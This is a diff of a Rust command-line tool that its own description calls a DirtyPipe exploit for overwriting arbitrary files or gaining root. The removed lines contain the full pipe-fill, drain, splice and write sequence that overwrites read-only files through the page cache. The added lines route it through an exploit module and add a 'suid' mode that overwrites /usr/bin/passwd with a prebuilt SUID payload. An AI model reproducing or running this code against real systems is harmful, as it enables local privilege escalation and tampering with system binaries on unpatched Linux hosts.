@@ -1,82 +1,56 @@
-use libc::{SYS_getpid, splice, syscall, open, O_RDONLY, c_char, loff_t};
-use std::io::{pipe, Read, Write};
-use std::os::fd::AsRawFd;
 use anyhow::{Result, anyhow};
-use std::fs;
-use std::ffi::CString;
-use std::ptr::null_mut;
-use std::path::PathBuf;
 use structopt::StructOpt;
+use std::path::{Path, PathBuf};
+use std::fs;
 
-const PIPE_SIZE: usize = 65536;
+mod exploit;
 
 #[derive(Debug, StructOpt)]
-#[structopt(name = "example", about = "An example of StructOpt usage.")]
+#[structopt(name = "DirtyPipe Exploit", about = "Exploit DirtyPipe to overwrite arbitrary files or gain root.")]
 struct Opt {
-    /// Mode. Can be "overwrite"
+    /// Mode. Can be "overwrite" or "suid"
     #[structopt(short, long)]
     mode: String,
 
     /// Input file. This data is what is written to the overwritten file.
-    #[structopt(short, long, required_if("mode", "overwrite"))]
-    input: PathBuf,
+    #[structopt(short, long)]
+    input: Option<PathBuf>,
 
     /// Output file. The file to overwrite.
-    #[structopt(short, long, required_if("mode", "overwrite"))]
-    output: PathBuf,
+    #[structopt(short, long)]
+    output: Option<PathBuf>,
 
     /// Offset to begin overwriting.
-    #[structopt(short="b", long, required_if("mode", "overwrite"))]
-    offset: i64,
+    #[structopt(short="b", long,)]
+    offset: Option<i64>,
 }
 
-fn main() -> Result<()> {
+fn main() -> Result<(), anyhow::Error> {
     let opt = Opt::from_args();
 
-    // Read input file.
-    let input_string = fs::read_to_string(&opt.input)?;
+    match opt.mode.as_str() {
+        "overwrite" => {
+            let input = opt.input.expect("input file is required in overwrite mode.");
+            let output = opt.output.expect("output file is required in overwrite mode.");
+            let offset = opt.offset.expect("offset is required in overwrite mode.");
 
-    // Create pipe
-    let (mut dirty_pipe_rx, mut dirty_pipe_tx) = pipe()?;
-    println!("Created pipe.");
+            return exploit::exploit(input, output, offset);
+        }
+        
+        "suid" => {
+            // Ensure payload exists.
+            if !Path::new("./suid").exists() {
+                return Err(anyhow!("SUID payload must be generated using the provided python script!"));
+            }
+            
 
-    // Fill with some data to set the PIPE_FLAG_CAN_MERGE flag
-    let mut data: Vec<u8> = vec![0u8; PIPE_SIZE];
-    dirty_pipe_tx.write_all(&data);
-    println!("Filled pipe.");
+            return exploit::exploit("./suid".into(), "/usr/bin/passwd".into(), 0);
+        }
 
-    // Drain pipe
-    let bytes_read = dirty_pipe_rx.read(&mut data)?;
-    println!("Drained (read) {} bytes", bytes_read);
-
-    // Read the target file to enter it into page cache
-    println!("{}", fs::read_to_string(&opt.output)?);
-
-    // Splice data from target file into the pipe
-    println!("Splicing...");
-    unsafe {
-        // Open file read only
-        let file_path = CString::new(opt.output.to_str().unwrap())?;
-        let fd = open(file_path.as_ptr(), O_RDONLY);
-        println!("FD: {}", fd);
-
-        // Splice
-        let mut offset: loff_t = opt.offset; // Needs to be page aligned
-        let num_bytes = splice(fd, &mut offset, dirty_pipe_tx.as_raw_fd(), null_mut(), 1, 0);
-        println!("Bytes spliced: {}", num_bytes);
+        _ => {
+             return Err(anyhow!("Mode must be overwrite or suid."));
+        }
     }
-
-    // Write arbitrary data into the pipe.
-    // This overwrites the cached file page instead of
-    // creating a new one (due to merge flag).
-    dirty_pipe_tx.write_all(input_string.as_bytes())?;
-    drop(dirty_pipe_tx);
-    let mut buf = String::new();
-    dirty_pipe_rx.read_to_string(&mut buf)?;
-    println!("{}", buf);
-
-    println!("File contents after overwrite attempt:");
-    println!("{}", fs::read_to_string(opt.output)?);
 
     Ok(())
 }
